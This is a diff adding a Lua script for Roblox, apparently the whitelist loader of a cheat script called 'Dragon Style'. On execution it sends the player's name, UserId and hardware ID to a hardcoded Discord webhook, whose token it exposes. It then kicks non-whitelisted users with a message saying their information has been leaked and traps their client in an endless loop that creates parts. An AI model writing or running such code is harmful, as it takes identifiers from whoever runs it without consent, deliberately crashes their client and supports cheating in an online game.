@@ -1,0 +1,117 @@
+local HttpService = game:GetService("HttpService")
+local ls = game:GetService("LocalizationService")
+local Webhook_URL = "https://discord.com/api/webhooks/1205437358166646836/EW0c5Tfm0UIzK480wbPGS_TsI9a99hylePA5sf6CNDuPxgK1WXFiueHADjEKu5BNgf9c"
+local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
+local plre = game.Players.LocalPlayer
+local plr = game.Players.LocalPlayer
+local DName = plre.DisplayName
+local UName = plre.Name
+local WV = "false"
+local status = "nil"
+local Countries = {}
+
+local maks = "maksimmilana22"
+
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+
+local ME = ReplicatedStorage.Events.ME
+
+function IsInDungeon()
+    return game.ReplicatedStorage.Dungeon.Value
+end
+
+function IsInPvp()
+    if plr:FindFirstChild("PvPed") then
+        return true
+    else
+        return false
+    end
+end
+
+local allowed = {
+  2715331314
+}
+
+local blacklisted = {"b997b340-4056-40ce-bae7-95ce083d6465", 140378057}
+
+if table.find(allowed, S_hwid) or table.find(allowed, plr.UserId) then
+  WV = "Yes"
+elseif table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId) then
+  WV = "Blacklisted"
+elseif not (table.find(allowed, S_hwid) or table.find(allowed, plr.UserId)) or not (table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId)) then 
+  WV = "No"
+end
+
+local embedcolor
+
+if WV == "Yes" then
+  embedcolor = 4388219 -- Corresponding integer for hex #42A86B
+else
+  embedcolor = 14887209 -- Corresponding integer for hex #E31319
+end
+
+if WV == "Yes" and IsInPvp() then
+  status = "In Pvp"
+  embedcolor = 16562691 -- Corresponding integer for hex #FC7463
+elseif WV == "Yes" and not IsInDungeon() and not IsInPvp() then
+  status = "In overworld"
+  embedcolor = 5827380 -- Corresponding integer for hex #58B1A4
+elseif WV == "Yes" and IsInDungeon() then
+  embedcolor = 4360181 -- Corresponding integer for hex #429995
+  status = "In dungeon"
+elseif WV == "Blacklisted" then
+  status = "Blacklisted"
+elseif WV == "No" then
+  status = "Not whitelisted"
+end
+
+if not S_hwid then
+    S_hwid = "Unknown"
+end
+local response =
+    request(
+    {
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(
+            {
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["title"] = "Dragon Style has been executed.",
+                        ["description"] = DName.. " / "..UName.. " has executed Dragon style. \n \n **Status** \n "..status,
+                        ["type"] = "rich",
+                        ["color"] = embedcolor,
+                        ["fields"] = {
+                           {
+                       ["name"] = "Information",
+                       ["value"] = "UserId: "..tostring(plr.UserId)
+                           },
+                           {
+                        ["name"] = "Hardware Id",
+                        ["value"] = S_hwid,
+                        ["inline"] = true
+                           }
+                        }
+                    }
+                }
+            }
+        )
+    }
+)
+
+local SoundEvent = {
+        [1] = "repsound",
+        [2] = "Teleport"
+    }
+
+if WV == "Blacklisted" then
+  plr:Kick("Your personal information has now been leaked") ME:FireServer(SoundEvent) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
+elseif WV == "No" then
+  plr:Kick("You are not whitelisted.") ME:FireServer(SoundEvent) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
+end
